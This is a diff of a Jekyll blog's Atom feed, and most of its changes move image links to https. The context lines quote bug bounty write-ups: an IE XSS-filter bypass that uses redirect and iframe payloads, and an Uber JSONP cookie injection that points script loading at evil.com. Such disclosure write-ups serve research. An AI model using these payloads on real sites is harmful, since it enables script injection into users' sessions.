@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.4">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2018-12-01T00:55:11+08:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Symbo1</title><entry><title type="html">bug bounty writeup - xss in url path</title><link href="http://localhost:4000/articles/2018/10/08/xss-in-url-path.html" rel="alternate" type="text/html" title="bug bounty writeup - xss in url path" /><published>2018-10-08T00:00:00+08:00</published><updated>2018-10-08T00:00:00+08:00</updated><id>http://localhost:4000/articles/2018/10/08/xss-in-url-path</id><content type="html" xml:base="http://localhost:4000/articles/2018/10/08/xss-in-url-path.html">&lt;h1 align=&quot;center&quot;&gt;bug bounty writeup - xss in url path&lt;/h1&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.4">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2018-12-01T02:36:48+08:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Symbo1</title><entry><title type="html">bug bounty writeup - xss in url path</title><link href="http://localhost:4000/articles/2018/10/08/xss-in-url-path.html" rel="alternate" type="text/html" title="bug bounty writeup - xss in url path" /><published>2018-10-08T00:00:00+08:00</published><updated>2018-10-08T00:00:00+08:00</updated><id>http://localhost:4000/articles/2018/10/08/xss-in-url-path</id><content type="html" xml:base="http://localhost:4000/articles/2018/10/08/xss-in-url-path.html">&lt;h1 align=&quot;center&quot;&gt;bug bounty writeup - xss in url path&lt;/h1&gt;
 &lt;p align=&quot;right&quot; class=&quot;date&quot;&gt;08 Oct 2018 - L3m0n&lt;/p&gt;
 
 &lt;p&gt;漏洞点: http://lemon.i/test/xss/13.php/i_am_xss_point/i_am_xss_point/&lt;/p&gt;
@@ -19,17 +19,17 @@ echo &quot;Action: &quot; . $action_name . &quot; has controller: \\&quot; . $co
 
 &lt;p&gt;如果404响应返回内容小于512字节，则使用IE自带的404页面&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;http://wx3.sinaimg.cn/mw690/9c5c5d93ly1fxqgmq53r6j216y0leq7a.jpg&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://wx3.sinaimg.cn/mw690/9c5c5d93ly1fxqgmq53r6j216y0leq7a.jpg&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;所以添加多个字符即可显示出来内容&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;http://wx2.sinaimg.cn/mw690/9c5c5d93ly1fxqgmuvz2hj21ny0f2wpl.jpg&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://wx2.sinaimg.cn/mw690/9c5c5d93ly1fxqgmuvz2hj21ny0f2wpl.jpg&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;2、url path问题 -&amp;gt; urlencode编码&lt;/p&gt;
 
 &lt;p&gt;浏览器下访问直接访问都会进行url编码&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;http://wx3.sinaimg.cn/mw690/9c5c5d93ly1fxqgqon7f6j217u08cwku.jpg&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://wx3.sinaimg.cn/mw690/9c5c5d93ly1fxqgqon7f6j217u08cwku.jpg&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;但是在IE下，使用3xx跳转后可以绕过&lt;/p&gt;
 
@@ -40,11 +40,11 @@ header(&quot;Location: &quot;http://&quot;.$_GET[&quot;host&quot;].&quot;/&quot;
 &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://evil.i/test/xss/12.php?host=lemon.i/test/xss/13.php&amp;amp;payload=&amp;lt;&amp;gt;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&amp;lt;&amp;gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;&lt;img src=&quot;http://wx1.sinaimg.cn/mw690/9c5c5d93ly1fxqgmz9un3j214o08k441.jpg&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://wx1.sinaimg.cn/mw690/9c5c5d93ly1fxqgmz9un3j214o08k441.jpg&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;但是可以看到ie filter限制了&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;http://wx2.sinaimg.cn/mw690/9c5c5d93ly1fxqgn2pu2uj21o008oqat.jpg&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://wx2.sinaimg.cn/mw690/9c5c5d93ly1fxqgn2pu2uj21o008oqat.jpg&quot; /&gt;&lt;/p&gt;
 
 &lt;h2 id=&quot;bypass-ie-filter&quot;&gt;bypass IE filter&lt;/h2&gt;
 
@@ -58,7 +58,7 @@ header(&quot;Location: &quot;http://&quot;.$_GET[&quot;host&quot;].&quot;/&quot;
 &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;iframe src=&quot;http://evil.i/test/xss/12.php?host=lemon.i/test/xss/13.php&amp;amp;payload=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&amp;lt;iframe&amp;gt;&quot; onload=&quot;contentWindow[0].location='http://evil.i/test/xss/12.php?host=lemon.i/test/xss/13.php&amp;amp;payload=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&amp;lt;img src=1 onerror=alert(1)&amp;gt;'&quot;&amp;gt;&amp;lt;/iframe&amp;gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;&lt;img src=&quot;http://wx3.sinaimg.cn/mw690/9c5c5d93ly1fxqgn6ql2dj21ek0k0dpu.jpg&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://wx3.sinaimg.cn/mw690/9c5c5d93ly1fxqgn6ql2dj21ek0k0dpu.jpg&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;但是又被一些坑点限制了:&lt;/p&gt;
 
@@ -77,7 +77,7 @@ header(&quot;Location: &quot;http://&quot;.$_GET[&quot;host&quot;].&quot;/&quot;
 &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;iframe src=&quot;http://evil.i/test/xss/12.php?host=lemon.i/test/xss/13.php&amp;amp;payload=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&amp;lt;iframe&amp;gt;&quot; onload=&quot;contentWindow[0].location='http://evil.i/test/xss/12.php?host=lemon.i/test/xss/13.php&amp;amp;payload=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&amp;lt;svg&amp;gt;&amp;lt;script&amp;gt;alert(document.domain)&amp;lt;b&amp;gt;'&quot;&amp;gt;&amp;lt;/iframe&amp;gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;&lt;img src=&quot;http://wx1.sinaimg.cn/mw690/9c5c5d93ly1fxqgnikd09j227y0to46b.jpg&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://wx1.sinaimg.cn/mw690/9c5c5d93ly1fxqgnikd09j227y0to46b.jpg&quot; /&gt;&lt;/p&gt;
 
 &lt;h2 id=&quot;referer&quot;&gt;Referer&lt;/h2&gt;
 
@@ -452,11 +452,11 @@ http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7735&lt;/p&gt;</content><
 },
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;&lt;img src=&quot;http://wx1.sinaimg.cn/mw690/9c5c5d93ly1fxqe8cbagsj21d00r0gsw.jpg&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://wx1.sinaimg.cn/mw690/9c5c5d93ly1fxqe8cbagsj21d00r0gsw.jpg&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;   Nothing suspicious? Not! When came cross these lines of code, I was thinking about whether the value of &lt;code class=&quot;highlighter-rouge&quot;&gt;this.rfiServer&lt;/code&gt; could be controlled by me. If yes, we can force the browser to load arbitrary javascript file. To understand this, you should know the essence of JSONP. The next step was searching everything about &lt;code class=&quot;highlighter-rouge&quot;&gt;rfiServer&lt;/code&gt;.&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;http://wx3.sinaimg.cn/mw690/9c5c5d93ly1fxqe84lvb3j20tm0f042c.jpg&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://wx3.sinaimg.cn/mw690/9c5c5d93ly1fxqe84lvb3j20tm0f042c.jpg&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;After reading through these lines of code:&lt;/p&gt;
 
@@ -480,13 +480,13 @@ null != a &amp;amp;&amp;amp; this.setRfiServer(a),
 &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;document.cookie = '_rfiServer=evil.com;domain=.uber.com;expires=Sat, 27 Jan 2018 01:43:57 GMT;path=/'
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;&lt;img src=&quot;http://wx1.sinaimg.cn/mw690/9c5c5d93ly1fxqe87abluj20yt0u0qel.jpg&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://wx1.sinaimg.cn/mw690/9c5c5d93ly1fxqe87abluj20yt0u0qel.jpg&quot; /&gt;&lt;/p&gt;
 
 &lt;h2 id=&quot;xss-of-ubercom-which-is-out-of-scope&quot;&gt;XSS of .uber.com which is Out of Scope&lt;/h2&gt;
 
 &lt;p&gt;I did really find out one reflected XSS in one of Uber’s subdomain using search engine. Let’s call the domain &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;redacted&amp;gt;.uber.com&lt;/code&gt; for demo.&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;http://wx4.sinaimg.cn/mw690/9c5c5d93ly1fxqe89pzq4j21dw0fy79z.jpg&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://wx4.sinaimg.cn/mw690/9c5c5d93ly1fxqe89pzq4j21dw0fy79z.jpg&quot; /&gt;&lt;/p&gt;
 
 &lt;ol&gt;
   &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;&quot;&lt;/code&gt; is reflected and not encoded. We can inject any attribution into &lt;code class=&quot;highlighter-rouge&quot;&gt;input&lt;/code&gt; tag.&lt;/li&gt;
